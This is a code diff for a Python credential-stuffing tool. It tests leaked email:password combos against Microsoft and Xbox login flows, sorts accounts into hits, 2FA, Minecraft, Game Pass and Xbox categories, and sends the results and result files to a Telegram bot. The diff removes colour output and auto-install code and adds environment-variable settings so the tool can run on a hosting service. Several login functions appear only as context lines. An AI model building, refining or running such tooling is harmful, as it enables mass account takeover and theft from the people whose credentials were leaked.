@@ -1,27 +1,3 @@
-import subprocess
-import sys
-
-try:
-    import requests
-    import urllib3
-    import warnings
-    from colorama import Fore, Style, init
-    MODULES_INSTALLED = True
-except ImportError:
-    MODULES_INSTALLED = False
-
-if not MODULES_INSTALLED:
-    print("Installing required modules...")
-    modules = ["requests", "colorama", "urllib3"]
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install"] + modules,
-                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print("✓ Modules installed! Please restart the script.\n")
-        import time; time.sleep(2); sys.exit(0)
-    except Exception as e:
-        print(f"Error: {e}\nInstall manually: pip install {' '.join(modules)}")
-        sys.exit(1)
-
 import re
 import time
 import threading
@@ -29,6 +5,10 @@ import concurrent.futures
 import os
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
+import requests
+import urllib3
+import warnings
+from colorama import Fore, Style, init
 
 init(autoreset=True)
 urllib3.disable_warnings()
@@ -134,7 +114,6 @@ class TelegramBot:
         self.base_url = f"https://api.telegram.org/bot{token}"
 
     def check_subscription(self, user_id):
-        """التحقق مما إذا كان المستخدم مشتركاً في القناة الإجبارية"""
         try:
             url = f"{self.base_url}/getChatMember"
             resp = requests.get(url, params={"chat_id": REQUIRED_CHANNEL, "user_id": user_id}, timeout=10)
@@ -189,13 +168,12 @@ class TelegramBot:
         except:
             return False
 
-bot: TelegramBot = None  # set in main
+bot: TelegramBot = None
 
 def tg_send_welcome():
-    # التحقق من اشتراك صاحب الـ Chat ID بالقناة قبل الإرسال
     if CHAT_ID and CHAT_ID.isdigit():
         if not bot.check_subscription(int(CHAT_ID)):
-            print(f"{Fore.RED}  ✗ المستخدم غير مشترك في القناة الإجبارية {REQUIRED_CHANNEL}! يرجى الاشتراك ليتمكن البوت من العمل.{Style.RESET_ALL}")
+            print(f"  ✗ المستخدم غير مشترك في القناة الإجبارية {REQUIRED_CHANNEL}!")
             bot.send_message(f"❌ عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه:\n{CHANNEL}")
             return False
 
@@ -293,56 +271,45 @@ def tg_send_files():
         time.sleep(0.5)
 
 # ══════════════════════════════════════════════
-# LIVE TABLE DISPLAY
 def print_table(total):
     os.system('cls' if os.name == 'nt' else 'clear')
     print(BANNER)
-
     W = 50
 
     def row(label, value, color=Fore.WHITE):
         val_str = str(value)
         pad = W - len(label) - len(val_str) - 4
-        print(f"{Fore.WHITE}│ {color}{label}{Fore.WHITE} │ {color}{val_str}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")
+        print(f"│ {color}{label} │ {color}{val_str}{' '*pad}│")
 
     def separator():
-        print(f"{Fore.WHITE}├{'─'*W}┤{Style.RESET_ALL}")
+        print(f"├{'─'*W}┤")
 
-    print(f"{Fore.WHITE}┌{'─'*W}┐{Style.RESET_ALL}")
-    print(f"{Fore.WHITE}│ {Fore.YELLOW}Status checking...{' '*(W-19)}{Fore.WHITE}│{Style.RESET_ALL}")
+    print(f"┌{'─'*W}┐")
+    print(f"│ Status checking...{' '*(W-19)}│")
     separator()
-
     row(f"✓ True ", stats.hits,   Fore.GREEN)
     row(f"✗ Bad  ", stats.bad,    Fore.RED)
     row(f"🔒 2FA ", stats.twofa,  Fore.YELLOW)
     row(f"↺ Retry", stats.retries,Fore.MAGENTA)
-
     separator()
-    print(f"{Fore.WHITE}│ {Fore.CYAN}{'#'}{' '*(W-2)}{Fore.WHITE}│{Style.RESET_ALL}")
+    print(f"│ {'#'}{' '*(W-2)}│")
     separator()
-
     row(f"⛏  Minecraft  ", stats.minecraft,  Fore.GREEN)
     row(f"🎮  Game Pass  ", stats.gamepass,   Fore.CYAN)
     row(f"🕹  Xbox       ", stats.xbox,       Fore.BLUE)
     row(f"🔓  Not Linked ", stats.not_linked, Fore.YELLOW)
-
     separator()
-
     pct      = (stats.checked / total * 100) if total > 0 else 0
     prog_str = f"Progress: {pct:.1f}% | {stats.checked}/{total} | {stats.get_cpm()} CPM"
     pad      = W - len(prog_str) - 2
-    print(f"{Fore.WHITE}│ {Fore.CYAN}{prog_str}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")
-
+    print(f"│ {prog_str}{' '*pad}│")
     separator()
-
     email_display = stats.current_email[:W-12] if len(stats.current_email) > W-12 else stats.current_email
     pad           = W - len(email_display) - 11
-    print(f"{Fore.WHITE}│ {Fore.YELLOW}Checking: {Fore.WHITE}{email_display}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")
-
-    print(f"{Fore.WHITE}└{'─'*W}┘{Style.RESET_ALL}")
+    print(f"│ Checking: {email_display}{' '*pad}│")
+    print(f"└{'─'*W}┘")
 
 # ══════════════════════════════════════════════
-# AUTH FUNCTIONS
 def get_sftag(session, max_attempts=MAX_RETRIES):
     for attempt in range(max_attempts):
         try:
@@ -547,8 +514,6 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
         time.sleep(0.3)
     return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}
 
-# ══════════════════════════════════════════════
-# MAIN CHECK
 def check_account(combo):
     try:
         parts = combo.strip().split(':')
@@ -676,12 +641,18 @@ def main():
 
     print(BANNER)
 
-    CHAT_ID    = input(f"{Fore.CYAN}  Enter your Telegram ID  : {Style.RESET_ALL}").strip()
-    combo_file = input(f"{Fore.CYAN}  Enter combo file path   : {Style.RESET_ALL}").strip()
+    # إذا كنت تستخدم Railway وتريد قراءة المعرف أو ملف الكومبو تلقائياً أو عبر المتغيرات البيئية:
+    CHAT_ID    = os.getenv("CHAT_ID", "").strip()
+    combo_file = os.getenv("COMBO_FILE", "combos.txt").strip()
+
+    if not CHAT_ID:
+        CHAT_ID = input(f"  Enter your Telegram ID  : ").strip()
+    if not combo_file:
+        combo_file = input(f"  Enter combo file path   : ").strip()
     print()
 
     if not os.path.exists(combo_file):
-        print(f"{Fore.RED}  ✗ File not found: {combo_file}{Style.RESET_ALL}")
+        print(f"  ✗ File not found: {combo_file}")
         return
 
     with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -689,23 +660,21 @@ def main():
 
     total = len(combos)
     if total == 0:
-        print(f"{Fore.RED}  ✗ No valid combos found!{Style.RESET_ALL}")
+        print(f"  ✗ No valid combos found!")
         return
 
     bot = TelegramBot(BOT_TOKEN, CHAT_ID)
 
-    print(f"{Fore.GREEN}  ✓ Loaded {total} combos{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}  ✓ Threads : {THREAD_COUNT}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}  ✓ Results → ./Results/{Style.RESET_ALL}\n")
+    print(f"  ✓ Loaded {total} combos")
+    print(f"  ✓ Threads : {THREAD_COUNT}")
+    print(f"  ✓ Results → ./Results/\n")
 
-    print(f"{Fore.YELLOW}  → Verifying Telegram subscription and sending welcome video...{Style.RESET_ALL}")
+    print(f"  → Verifying Telegram subscription and sending welcome video...")
     if tg_send_welcome():
-        print(f"{Fore.GREEN}  ✓ Welcome video sent successfully!{Style.RESET_ALL}\n")
+        print(f"  ✓ Welcome video sent successfully!\n")
     else:
-        print(f"{Fore.RED}  ✗ Operation stopped: The user must be subscribed to {REQUIRED_CHANNEL} to use the tool.{Style.RESET_ALL}\n")
+        print(f"  ✗ Operation stopped: The user must be subscribed to {REQUIRED_CHANNEL} to use the tool.\n")
         return
-
-    input(f"{Fore.GREEN}  Press ENTER to start checking...{Style.RESET_ALL}")
 
     stop_event = threading.Event()
     def display_loop():
@@ -725,19 +694,19 @@ def main():
     disp.join(timeout=1)
 
     print_table(total)
-    print(f"\n{Fore.GREEN}  ✓ Checking complete!{Style.RESET_ALL}\n")
+    print(f"\n  ✓ Checking complete!\n")
 
-    print(f"{Fore.YELLOW}  → Sending final stats...{Style.RESET_ALL}")
+    print(f"  → Sending final stats...")
     tg_send_final()
 
-    print(f"{Fore.YELLOW}  → Sending result files...{Style.RESET_ALL}")
+    print(f"  → Sending result files...")
     tg_send_files()
-    print(f"{Fore.GREEN}  ✓ Done! Check your Telegram.{Style.RESET_ALL}\n")
+    print(f"  ✓ Done! Check your Telegram.\n")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}  ✗ Stopped by user{Style.RESET_ALL}")
+        print(f"\n  ✗ Stopped by user")
     except Exception as e:
-        print(f"\n{Fore.RED}  ✗ Fatal error: {e}{Style.RESET_ALL}")
+        print(f"\n  ✗ Fatal error: {e}")
